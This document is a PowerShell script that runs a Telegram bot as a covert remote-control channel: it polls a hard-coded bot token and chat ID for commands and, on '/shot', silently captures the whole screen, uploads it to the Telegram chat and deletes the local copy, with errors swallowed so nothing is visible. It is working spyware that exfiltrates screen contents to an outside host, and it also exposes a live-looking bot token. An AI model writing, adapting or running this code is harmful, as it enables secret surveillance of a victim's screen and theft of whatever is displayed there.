$TOKEN = "8967532230:AAGQCC5P_JWRkabj1T4T3AA_cGyCU-IiHoQ"
$CHAT_ID = "7449622794"
$API = "https://api.telegram.org/bot$TOKEN"

function Send-Message {
    param($Text)
    try {
        $Body = @{chat_id = $CHAT_ID; text = $Text}
        Invoke-RestMethod -Uri "$API/sendMessage" -Method Post -Body $Body -ErrorAction Stop
    } catch {
        # Silent fail
    }
}

function Send-Screenshot {
    try {
        $Path = "$env:TEMP\screenshot.png"
        
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $Bitmap.Size)
        $Bitmap.Save($Path, [System.Drawing.Imaging.ImageFormat]::Png)
        $Graphics.Dispose()
        $Bitmap.Dispose()
        
        $Uri = "$API/sendPhoto"
        $Boundary = "---------------------------$([DateTime]::Now.Ticks.ToString('x'))"
        $FileBytes = [System.IO.File]::ReadAllBytes($Path)
        
        $Body = @()
        $Body += [System.Text.Encoding]::UTF8.GetBytes("--$Boundary`r`n")
        $Body += [System.Text.Encoding]::UTF8.GetBytes("Content-Disposition: form-data; name=`"chat_id`"`r`n`r`n")
        $Body += [System.Text.Encoding]::UTF8.GetBytes("$CHAT_ID`r`n")
        $Body += [System.Text.Encoding]::UTF8.GetBytes("--$Boundary`r`n")
        $Body += [System.Text.Encoding]::UTF8.GetBytes("Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"`r`n")
        $Body += [System.Text.Encoding]::UTF8.GetBytes("Content-Type: image/png`r`n`r`n")
        $Body += $FileBytes
        $Body += [System.Text.Encoding]::UTF8.GetBytes("`r`n--$Boundary--`r`n")
        
        $Headers = @{"Content-Type" = "multipart/form-data; boundary=$Boundary"}
        
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        $Request = [System.Net.WebRequest]::Create($Uri)
        $Request.Method = "POST"
        $Request.Timeout = 120000
        $Request.ContentType = "multipart/form-data; boundary=$Boundary"
        $Request.ContentLength = $Body.Count
        
        $Stream = $Request.GetRequestStream()
        $Stream.Write($Body, 0, $Body.Count)
        $Stream.Close()
        
        $Response = $Request.GetResponse()
        $Reader = New-Object System.IO.StreamReader($Response.GetResponseStream())
        $Result = $Reader.ReadToEnd()
        $Reader.Close()
        $Response.Close()
        
        Remove-Item $Path -Force
        return $true
    } catch {
        return $false
    }
}

function Clear-OldMessages {
    try {
        $Updates = Invoke-RestMethod -Uri "$API/getUpdates?limit=1" -Method Get -ErrorAction Stop
        if ($Updates.ok -and $Updates.result) {
            $LastId = $Updates.result[-1].update_id
            $null = Invoke-RestMethod -Uri "$API/getUpdates?offset=$($LastId + 1)" -Method Get -ErrorAction Stop
        }
    } catch {
        # Silent fail
    }
}

function Listen-Commands {
    try {
        Clear-OldMessages
        Send-Message "🔄 Bot Started with PowerShell!"
        
        $Offset = 0
        while ($true) {
            try {
                $Updates = Invoke-RestMethod -Uri "$API/getUpdates?offset=$Offset&timeout=30" -Method Get -ErrorAction Stop
                
                if ($Updates.ok) {
                    foreach ($Update in $Updates.result) {
                        $Offset = $Update.update_id + 1
                        $Text = $Update.message.text
                        
                        if ($Text -eq "/shot") {
                            Send-Message "📸 Taking screenshot..."
                            $Result = Send-Screenshot
                            if ($Result) {
                                Send-Message "✅ Screenshot sent!"
                            } else {
                                Send-Message "❌ Failed to send screenshot"
                            }
                        } elseif ($Text -eq "/exit") {
                            Send-Message "🛑 Bot stopped"
                            return
                        }
                    }
                }
                Start-Sleep -Seconds 1
            } catch {
                Start-Sleep -Seconds 5
            }
        }
    } catch {
        # Silent fail
    }
}

Listen-Commands
